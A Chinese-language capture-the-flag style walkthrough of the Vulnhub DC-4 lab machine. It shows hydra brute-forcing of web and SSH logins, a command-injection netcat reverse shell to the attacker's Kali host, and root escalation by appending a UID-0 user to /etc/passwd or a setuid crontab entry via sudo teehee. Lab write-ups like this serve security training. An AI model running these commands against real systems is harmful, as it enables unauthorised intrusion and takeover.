---
layout: mypost
title: Vulnhub靶机DC4渗透
categories: [靶机]
---

靶机下载地址：[DC4](https://www.vulnhub.com/entry/dc-4,313/)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/04/24/cvPcg1.png)

DC4 地址：192.168.43.195

访问 web 页面

![](https://z3.ax1x.com/2021/04/24/cvP5Ue.png)

dirb 扫目录无发现，直接上 hydra 爆破，用[这里](https://wiki.skullsecurity.org/Passwords)的字典

```bash
bunzip2 rockyou.txt.bz2
hydra -l admin -P rockyou.txt 192.168.43.195 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
```

![](https://z3.ax1x.com/2021/04/24/cviNPH.png)

账号 admin 密码 happy

![](https://z3.ax1x.com/2021/04/24/cviBsP.png)

![](https://z3.ax1x.com/2021/04/24/cviDqf.png)

发现有命令执行

burp 抓包

![](https://z3.ax1x.com/2021/04/24/cvigiQ.png)

成功执行

![](https://z3.ax1x.com/2021/04/24/cvk84e.png)

发现四个用户（还可以在这深入获得 ssh 密码）

直接反弹 shell

```bash
nc 192.168.43.110 444 -e /bin/bash
nc%20192.168.43.110%20444%20-e%20/bin/bash
```

![](https://z3.ax1x.com/2021/04/24/cvm78O.png)

![](https://z3.ax1x.com/2021/04/24/cvkRuq.png)

成功上线，用 python 获取标准交互shell

![](https://z3.ax1x.com/2021/04/24/cvk4ET.png)

看了一圈只有 jim 下有内容

![](https://z3.ax1x.com/2021/04/24/cvkODx.png)

其中 test.sh 如下

![](https://z3.ax1x.com/2021/04/24/cvAPxA.png)

old-passwords.bak 里是 ssh 密码

继续用 hydra 爆破（注意字典空格）

```bash
hydra -L user.txt -P password.txt  -t 6 ssh://192.168.43.195 
```

![](https://z3.ax1x.com/2021/04/24/cvA3q0.png)

jim 密码  jibril04 

登录 ssh

```bash
ssh jim@192.168.43.195
```

![](https://z3.ax1x.com/2021/04/24/cvEmex.png)

提示查看 mail

![](https://z3.ax1x.com/2021/04/24/cvE0fg.png)

jim 没有 sudo 权限

![](https://z3.ax1x.com/2021/04/24/cvVcgH.png)

mail 下 发现 charles 密码 ^xHhA&hvim0y

![](https://z3.ax1x.com/2021/04/24/cvZKRe.png)

切换用户

![](https://z3.ax1x.com/2021/04/24/cvZ1sA.png)

charles 有 sudo 权限，提示用 teehee 提权

![](https://z3.ax1x.com/2021/04/24/cvZBss.png)

使用teehee命令特性创建一个用户，直接写入 passwd 中

设置 uid 和 gid 都为0，相当于 root

[用户名]：[密码占位符]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]

```bash
echo "stan::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
su stan
```

![](https://z3.ax1x.com/2021/04/24/cvZTdx.png)

Pwned！

还可以通过定时任务执行脚本提权，向 /etc/crontab 文件中写入新的定时任务

![](https://z3.ax1x.com/2021/04/24/cvnAqs.png)

通过 teehee 以 root 身份写入 crontab 计划任务通过执行获得 root 权限

```bash
echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab 
```

时间部分全部填 * ，默认这个定时任务每分钟执行一次

通过执行的脚本将 /bin/sh 的权限改为4777，就可以非 root 执行，并且期间拥有 root 权限

![](https://z3.ax1x.com/2021/04/24/cvnuGT.png)